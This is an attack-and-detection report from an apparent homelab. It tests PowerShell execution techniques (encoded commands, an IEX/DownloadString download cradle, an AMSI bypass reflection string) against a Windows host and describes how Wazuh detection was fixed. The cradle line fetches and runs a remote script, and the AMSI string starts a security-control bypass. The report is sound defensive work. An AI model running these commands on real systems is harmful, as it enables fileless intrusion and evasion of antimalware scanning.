# Attack Report: T1059.001 — PowerShell Execution

**Date:** 2026-10-27 to 2026-11-09 (multi-session, see Incident 007)  
**ATT&CK ID:** T1059.001  
**Technique:** Command and Scripting Interpreter — PowerShell  
**Tactic:** Execution  
**Tools:** Native PowerShell (-EncodedCommand, -ExecutionPolicy Bypass, IEX)  
**Attacker:** Kali Linux — 192.168.2.40 (ATTACKNET segment, commands issued remotely via documented scenarios) / Windows 10 local console (for diagnostic verification)  
**Target:** Windows 10 Evaluation — 192.168.1.30  
**Detection result:** FULL — after multi-layer pipeline fix (see Incident 007)  
**Ground truth timestamps:** Logged per scenario via `gtruth`, see scenario-001.csv  

---

## Technique Description

T1059.001 is one of the most heavily used techniques in the MITRE ATT&CK
framework because PowerShell is a Living off the Land (LotL) tool —
it ships natively on every Windows 7 and later system, requires no
upload or installation, and is frequently whitelisted by organisations
because IT teams use it constantly for legitimate administration.

Attackers exploit three properties of PowerShell specifically:

**Availability** — no custom tooling is needed. The interpreter is
already present on the target.

**Capability** — PowerShell can download files, create scheduled tasks,
modify the registry, query Active Directory, interact with the Windows
API directly via reflection, and execute code entirely in memory
without writing to disk (a fileless attack).

**Trust** — security tools and organisational policy often treat
PowerShell as inherently legitimate, creating a detection blind spot
that this investigation directly confirmed exists by default.

In the South African context, large enterprises including banks and
government departments rely heavily on PowerShell for Windows
administration. An attacker who obtains any foothold typically pivots
to PowerShell immediately to download further tooling, move laterally,
and dump credentials — exactly the sequence this attack chain and the
following T1003.001 attack represent together.

## Three Scenarios Tested

| Scenario | Technique | Purpose |
|---|---|---|
| A | `-EncodedCommand` with Base64-encoded payload | Evades simple string-matching detection; common obfuscation method |
| B | Download cradle (`IEX` + `DownloadString`) | Fileless execution — downloads and runs code without touching disk |
| C | AMSI bypass reflection string | Attempts to disable Windows' built-in PowerShell security scanning |

## Pre-Attack Setup

### Execution policy confirmed restrictive (realistic baseline)

```powershell
Get-ExecutionPolicy
# Restricted
```

Restricted policy blocks direct script file execution, forcing use of
`-Command`, `-EncodedCommand`, or `-ExecutionPolicy Bypass` — exactly
the patterns real attackers use to work around this control, and
exactly what this report tests.


## Attack Execution

### Scenario A — Base64 Encoded Command

**Correct encoding method** (UTF-16LE then Base64, matching how real
obfuscation tooling and frameworks such as Cobalt Strike generate
PowerShell payloads):

```powershell
$command = 'whoami'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encodedCommand
```

Output: `homelab\administrator`

### Scenario B — Download Cradle

```powershell
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1')"
```

**Technique breakdown:** `IEX` (alias for `Invoke-Expression`) executes
a string as a PowerShell command. `(New-Object Net.WebClient).
DownloadString(url)` fetches a remote script's content as a string
without ever saving it to disk. Combined, this is the canonical fileless
download-and-execute pattern — the single most common PowerShell attack
primitive observed in real-world intrusions.

### Scenario C — AMSI Bypass Reflection String

```powershell
powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
```

**Technique breakdown:** AMSI (Antimalware Scan Interface) is the
mechanism by which Windows Defender inspects PowerShell commands before
execution. This command is the first step of the most widely documented
AMSI bypass technique — using .NET reflection to access the internal
`AmsiUtils` class, which a full bypass would then patch in memory to
disable scanning. The string `AmsiUtils` combined with `[Ref].Assembly.
GetType` is a known, signatured pattern.

## Initial Detection Result: ZERO ALERTS

All three scenarios executed successfully and were independently
confirmed via direct Sysmon event log inspection on Windows 10. Wazuh
Threat Hunting showed **no alerts** for any scenario across multiple
search windows. This triggered a full diagnostic investigation,
documented in full as
[troubleshooting-log/007](../../troubleshooting-log/007-powershell-detection-pipeline.md).

### Summary of the four root causes identified and fixed

1. **Manager vs agent configuration confusion** — Sysmon collection had
   been configured on the Wazuh manager's local ossec.conf rather than
   distributed to agents via agent.conf. Fixed by populating
   `/var/ossec/etc/shared/default/agent.conf` with ten event channels
   including Sysmon and PowerShell operational.
2. **Script Block Logging disabled by default** — required explicit
   registry configuration to capture decoded command content as Event
   ID 4104. Verified this setting survived a forced Group Policy update
   from the Domain Controller.
3. **Operational noise from PowerShell's own `prompt` re-evaluation** —
   count-based log queries (`-MaxEvents 5`) were being flooded by
   PowerShell's internal prompt redraw script block, masking genuine
   attack-relevant 4104 events. Fixed by switching to time-window
   queries.
4. **Agent event queue throttling** — default Wazuh agent buffer limits
   (5000 event queue, 500 events/second) were silently dropping events
   under the combined load of ten simultaneously-collecting channels.
   Confirmed directly by Wazuh's own internal queue-health alerts (rules
   202, 203, 204). Fixed by tuning `client_buffer` to a 10000 event
   queue and 1000 events/second cap.

Full technical detail, exact commands, and verification evidence for
each layer is documented in Incident 007.

### Rule analysis

**Rule 92057 (level 12) — the key result.** This rule explicitly and
specifically identifies Base64-encoded PowerShell execution by name,
rather than detecting it indirectly through a side effect. This is the
deep, intent-specific detection the investigation was aiming to achieve
for Scenario A.

**Rule 92213 (level 15, fired twice) — highest severity in Wazuh's
ruleset.** Triggered by Sysmon Event ID 11 (FileCreate) when PowerShell
writes an executable or script file into a temp or user-data folder
commonly associated with malware staging. This fired in connection with
the download cradle scenario (B), where PowerShell's own policy-test
temp file creation (`__PSScriptPolicyTest_*.ps1`) served as the trigger
— a side-effect detection rather than a direct one, but at the highest
possible severity.

**Rule 92066 (level 4) — SecEdit launched by PowerShell.** `secedit.exe`
is a legitimate Windows security configuration tool, but its invocation
from `powershell.exe` in a non-standard path is flagged as anomalous
process ancestry — this was actually PowerShell's own internal
telemetry-gathering script block (`LSAAnonymousNameLookup` check)
observed during the Layer 3 noise investigation, not a scenario we
deliberately triggered, but a useful confirmation that Wazuh's process
ancestry rules are working correctly.

**Rule 91816 (level 4) — PowerShell querying environment variables.**
A relatively generic content-match rule, included here for completeness
as it fired on more benign script block content observed during testing.

## Detection Verdict

**FULL (after remediation)** — Initial state was a complete blind spot
(zero detections across all three scenarios). Following the four-layer
pipeline fix documented in Incident 007, Wazuh now provides specific,
named detection for Base64-encoded PowerShell execution (rule 92057)
and high-severity detection of file-drop side effects from fileless
execution attempts (rule 92213).

## Detection Gaps Remaining

**Scenario C (AMSI bypass) — not yet confirmed with a dedicated rule.**
While the reflection-based AMSI access attempt executed and was logged
via Sysmon process creation, no Wazuh rule in the current ruleset
specifically names `AmsiUtils` or AMSI bypass patterns. This remains an
open gap for Phase 4 custom rule development — a Sigma rule targeting
`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` and
related reflection-based AMSI bypass strings would close this.

**Download cradle (Scenario B) detected only via side effect.** Rule
92213 fired because of a temp file write, not because of the `IEX` +
`DownloadString` pattern itself. A purely in-memory download cradle
that avoids any disk write (achievable with more advanced techniques)
would not trigger this rule. A Phase 4 custom rule matching
`scriptBlockText` content for `DownloadString`, `IEX`, `Invoke-
Expression`, `Net.WebClient`, and `Net.Http.HttpClient` patterns is
recommended.

**PowerShell prompt noise has no suppression rule.** As documented in
Incident 007 Layer 3, any custom rule built on the
`Microsoft-Windows-PowerShell/Operational` channel must explicitly
exclude `scriptBlockText` values of `prompt` and `$global:?`, or
false-positive volume will be unmanageable at scale. This should be
built into the Phase 4 rule design from the start rather than
discovered the hard way.

## Lessons Learned

**A quiet SIEM is not a secure environment — it may be a broken one.**
The single most important lesson from this attack is that zero alerts
following confirmed malicious activity demands investigation, not
reassurance. Four separate root causes were hiding behind that silence,
and each one individually looked like a plausible "working as intended"
state until directly challenged.

**Architecture understanding matters more than configuration syntax.**
The Layer 1 root cause — writing Sysmon collection config to the wrong
file — was syntactically perfect XML that simply applied to the wrong
scope. Understanding Wazuh's manager/agent/agent.conf distribution model
was the actual fix, not any specific command.

**Telemetry breadth has a resource cost that must be tuned
explicitly.** Adding ten event channels without corresponding buffer
tuning (Layer 4) created silent data loss under normal operational load
— not an edge case, but routine multi-channel activity. This is a
direct, empirical data point for the merged roadmap's Phase 4 research
question about telemetry-versus-resource-cost tradeoffs in
resource-constrained environments.

**Encoding format matters for authenticity.** An incorrectly-generated
Base64 string (attempted mid-investigation with manually-crafted
encoding) produced corrupted output rather than a clean failure — a
reminder that `-EncodedCommand` specifically requires UTF-16LE encoding
before Base64, and that real attacker tooling handles this
automatically, which is worth replicating correctly for realistic
testing.

## SA Market Relevance

PowerShell-based Living off the Land attacks are the primary execution
method observed in ransomware precursor chains and banking trojan
delivery across the SA financial sector. The specific detection gap
found here — encoded commands and download cradles going completely
undetected by a freshly-deployed, seemingly well-configured SIEM — is
directly analogous to real incidents where organisations discover,
often during post-breach forensics, that their EDR/SIEM deployment had
silent telemetry gaps for months. This investigation demonstrates the
exact verification discipline (confirm at the source, don't trust
dashboard silence) that Joint Standard 2's incident recovery and
periodic audit requirements are designed to enforce.
